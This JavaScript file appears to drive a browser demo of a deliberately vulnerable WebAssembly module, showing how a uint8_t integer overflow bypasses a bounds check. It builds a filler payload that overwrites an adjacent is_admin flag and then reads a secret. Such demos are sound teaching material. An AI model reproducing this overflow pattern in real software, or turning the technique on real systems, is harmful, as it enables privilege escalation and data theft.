let M = null;

const ITEM_SIZE = 8;
const BUF_SIZE = 32;   // sizeof(g_state.data)

function log(msg, cls = '') {
    const el = document.getElementById('log');
    const line = document.createElement('div');
    line.className = 'log-line' + (cls ? ' ' + cls : '');
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
}

function setStatus(text) {
    document.getElementById('status').textContent = text;
}

function doSubmit() {
    if (!M) return;
    M.ccall('reset_state', 'void', [], []);

    const count = parseInt(document.getElementById('countInput').value, 10);
    if (isNaN(count) || count < 0 || count > 255) {
        setStatus('item_count must be between 0 and 255 (fits uint8_t).');
        return;
    }

    const trueSize = count * ITEM_SIZE;          // actual bytes to write
    const computedU8 = trueSize & 0xFF;            // uint8_t truncation

    log(`[submit_items] item_count=${count}, ITEM_SIZE=${ITEM_SIZE}`);
    log(`  uint8_t total = ${count} × ${ITEM_SIZE} = ${trueSize} → ${computedU8} (after uint8_t wrap)`,
        computedU8 === 0 && trueSize > 0 ? 'bad' : 'info');
    log(`  bounds check:  ${computedU8} > ${BUF_SIZE} → ${computedU8 > BUF_SIZE ? 'REJECT' : 'ACCEPT'}`,
        computedU8 > BUF_SIZE ? 'ok' : computedU8 === 0 && trueSize > 0 ? 'bad' : 'info');

    if (trueSize === 0) {
        setStatus('item_count=0 — nothing to do.');
        return;
    }

    // Build payload: trueSize bytes.
    // Byte at offset 32 (= is_admin) is set to 0x01 to trigger the exploit.
    const payload = new Uint8Array(trueSize);
    payload.fill(0x41);  // 'A' as filler
    if (trueSize > BUF_SIZE) {
        payload[BUF_SIZE] = 0x01;  // overwrite is_admin
    }

    const ptr = M._malloc(trueSize);
    M.HEAPU8.set(payload, ptr);
    const accepted = M.ccall('submit_items', 'number', ['number', 'number'], [count, ptr]);
    M._free(ptr);

    if (accepted) {
        log(`  submit_items → ACCEPTED (validation passed)`, trueSize > BUF_SIZE ? 'bad' : 'ok');
        log(`  actual bytes written: ${trueSize}`, trueSize > BUF_SIZE ? 'bad' : 'ok');
    } else {
        log(`  submit_items → REJECTED (validation worked correctly)`, 'ok');
    }

    const isAdmin = M.ccall('get_admin_status', 'number', [], []);
    const secret = M.UTF8ToString(M.ccall('read_secret', 'number', [], []));
    log(`  is_admin = ${isAdmin}`, isAdmin ? 'bad' : 'ok');
    log(`  read_secret → "${secret}"`, isAdmin ? 'bad' : 'ok');

    setStatus(isAdmin
        ? '⚠ Admin access gained via integer overflow!'
        : 'Access denied — no overflow occurred.');
}

function doReset() {
    if (!M) return;
    M.ccall('reset_state', 'void', [], []);
    clearLog();
    document.getElementById('countInput').value = '';
    setStatus('Reset. Ready.');
}

createModule().then(mod => {
    M = mod;
    setStatus('WASM loaded. Ready to test.');
});

document.getElementById('btnSubmit').addEventListener('click', doSubmit);
document.getElementById('btnReset').addEventListener('click', doReset);
